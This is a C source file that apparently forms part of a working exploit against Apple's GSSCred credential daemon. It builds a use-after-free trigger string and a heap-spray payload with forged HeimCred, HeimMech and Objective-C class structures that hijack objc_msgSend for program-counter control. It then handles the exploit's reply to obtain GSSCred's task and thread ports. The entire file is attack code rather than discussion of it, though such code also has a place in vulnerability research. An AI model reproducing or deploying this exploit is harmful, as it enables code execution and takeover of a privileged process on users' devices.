#include "payload.h"

#include "log.h"

#include <assert.h>
#include <objc/objc.h>
#include <string.h>
#include <sys/types.h>

#if __arm64__
#include "arm64/arm64_payload.h"
#endif

// ---- Payload offsets ---------------------------------------------------------------------------

// These are the offsets of the various objects in our payload. The full structures of
// these objects overlap so as to pack them at the front of the page, leaving the rest of the
// contents available for JOP use.

static const ssize_t PAYLOAD_OFFSET__HeimMech = 0x0010;	// 10 - 18  ->  20 - 28
static const ssize_t PAYLOAD_OFFSET__name     = 0x0028;	//  0 -  8  ->  28 - 30
static const ssize_t PAYLOAD_OFFSET__class    = 0x0000;	// 10 - 1c  ->  10 - 1c
static const ssize_t PAYLOAD_OFFSET__bucket   = 0x0000;	//  0 - 10  ->   0 - 10

// ---- Structure offsets -------------------------------------------------------------------------

// These are the offsets of the fields of relevant structures.

static const size_t OFFSET__CFString__characters = 0x11;
static const size_t OFFSET__HeimCred__mech       = 0x20;
static const size_t OFFSET__HeimMech__name       = 0x10;
static const size_t OFFSET__objc_object__isa     = 0;
static const size_t OFFSET__objc_class__buckets  = 0x10;
static const size_t OFFSET__objc_class__mask     = 0x18;
static const size_t OFFSET__bucket_t__key        = 0;
static const size_t OFFSET__bucket_t__imp        = 8;

// ---- Constants for platform-specific payload generation ----------------------------------------

const size_t PAYLOAD_OFFSET_PC   = PAYLOAD_OFFSET__bucket + OFFSET__bucket_t__imp;
const size_t PAYLOAD_OFFSET_ARG1 = PAYLOAD_OFFSET__name;

// ---- Payload generation ------------------------------------------------------------------------

// Generate the string that will be repeatedly deserialized and allocated by GSSCred. If all goes
// according to plan, the HeimCred object will be freed and then reallocated as a CFString, and the
// CFString's inline characters will overlap with the HeimCred's "mech" pointer. Thus, after we've
// corrupted the HeimCred, its "mech" field will point to the heap-sprayed data.
static void
generate_uaf_string(char *uaf_string) {
	memset(uaf_string, 'A', GSSCRED_RACE_UAF_STRING_SIZE);
	uint8_t *fake_HeimCred = (uint8_t *)uaf_string - OFFSET__CFString__characters;
	uint8_t *HeimCred_mech = fake_HeimCred + OFFSET__HeimCred__mech;
	*(uint64_t *)HeimCred_mech = GSSCRED_RACE_PAYLOAD_ADDRESS + PAYLOAD_OFFSET__HeimMech;
}

// Generate part of the payload that will be sprayed in the address space of the target process and
// hopefully be mapped at GSSCRED_RACE_PAYLOAD_ADDRESS. GSSCred will pass the name pointer in the
// fake HeimMech to CFDictionaryGetValue(), which will cause objc_msgSend() to be called on the
// fake name object with the "hash" selector. This function generates the platform-independent part
// of the payload, which gets PC control. Everything after that is managed by the platform-specific
// payload.
static void
generate_generic_payload(uint8_t *payload) {
	// Fill unused space with a distinctive byte pattern.
	memset(payload, 0x51, GSSCRED_RACE_PAYLOAD_SIZE);

	// Get pointers to each region of the local buffer.
	uint8_t *payload_HeimMech = payload + PAYLOAD_OFFSET__HeimMech;
	uint8_t *payload_name     = payload + PAYLOAD_OFFSET__name;
	uint8_t *payload_class    = payload + PAYLOAD_OFFSET__class;
	uint8_t *payload_bucket   = payload + PAYLOAD_OFFSET__bucket;

	// Get the addresses of each region in the target process.
	uint64_t address_name     = GSSCRED_RACE_PAYLOAD_ADDRESS + PAYLOAD_OFFSET__name;
	uint64_t address_class    = GSSCRED_RACE_PAYLOAD_ADDRESS + PAYLOAD_OFFSET__class;
	uint64_t address_bucket   = GSSCRED_RACE_PAYLOAD_ADDRESS + PAYLOAD_OFFSET__bucket;

	// Construct the HeimMech object. We only care about the "name" field, which is usually a
	// pointer to a CFString.
	*(uint64_t *)(payload_HeimMech + OFFSET__HeimMech__name) = address_name;

	// Construct the name object. We only care about the "isa" field, which is a pointer to the
	// objc_class for this instance.
	*(uint64_t *)(payload_name + OFFSET__objc_object__isa) = address_class;

	// Construct the Objective-C class object. Since the fake name object will have the "hash"
	// method called, we want the fake class object to have a cache hit for the "hash"
	// selector. We ensure that objc_msgSend() always starts at the first bucket by setting
	// "mask" to 0.
	*(uint64_t *)(payload_class + OFFSET__objc_class__buckets) = address_bucket;
	*(uint32_t *)(payload_class + OFFSET__objc_class__mask)    = 0;

	// Construct the bucket_t that has a hit for the "hash" selector. Since the shared cache is
	// mapped at the same address in all processes, the "hash" selector will reside at the same
	// address in GSSCred as it does in our process. We use a placeholder PC value since the
	// actual PC for the exploit will be determined by the platform-specific payload generator.
	uint64_t sel_hash = (uint64_t) sel_registerName("hash");
	*(uint64_t *)(payload_bucket + OFFSET__bucket_t__key) = sel_hash;
	*(uint64_t *)(payload_bucket + OFFSET__bucket_t__imp) = 0x0011223344556677;
}

bool
gsscred_race_build_exploit_payload(char *uaf_string, uint8_t *payload) {
	platform_payload_generator_fn generate_platform_payload = NULL;
#if __arm64__
	generate_platform_payload = arm64_choose_payload()->build_payload;
#endif
	generate_uaf_string(uaf_string);
	generate_generic_payload(payload);
	if (generate_platform_payload == NULL) {
		ERROR("No payload available for this platform");
		return false;
	}
	generate_platform_payload(payload);
	return true;
}

enum process_exploit_message_result
gsscred_race_process_exploit_message(const mach_msg_header_t *exploit_message,
		mach_port_t *task_port, mach_port_t *thread_port) {
	// Skip messages that are not the exploit message.
	if (exploit_message->msgh_id != EXPLOIT_MACH_MESSAGE_ID) {
		DEBUG_TRACE(1, "Received unexpected message ID %x on listener "
				"port", exploit_message->msgh_id);
		return PROCESS_EXPLOIT_MESSAGE_RESULT_CONTINUE;
	}
	// All other messages get delegated to the message processing routine for the payload sent
	// earlier.
	payload_message_processor_fn process_exploit_message = NULL;
#if __arm64__
	process_exploit_message = arm64_choose_payload()->process_message;
#endif
	assert(process_exploit_message != NULL);
	enum process_exploit_message_result result =
		process_exploit_message(exploit_message, task_port, thread_port);
	if (result == PROCESS_EXPLOIT_MESSAGE_RESULT_SUCCESS) {
		kern_return_t kr = thread_suspend(*thread_port);
		if (kr != KERN_SUCCESS) {
			WARNING("Could not suspend the exploit thread");
		}
	}
	return result;
}

bool
check_task_port(mach_port_t task_port) {
	// Check that the task port we received in our exploit message is valid.
	int pid = -1;
	kern_return_t kr = pid_for_task(task_port, &pid);
	if (kr != KERN_SUCCESS) {
		WARNING("Message from exploit payload contains invalid "
				"task port %x: %x", task_port, kr);
		return false;
	}
	DEBUG_TRACE(1, "GSSCred's PID is %u", pid);
	return true;
}
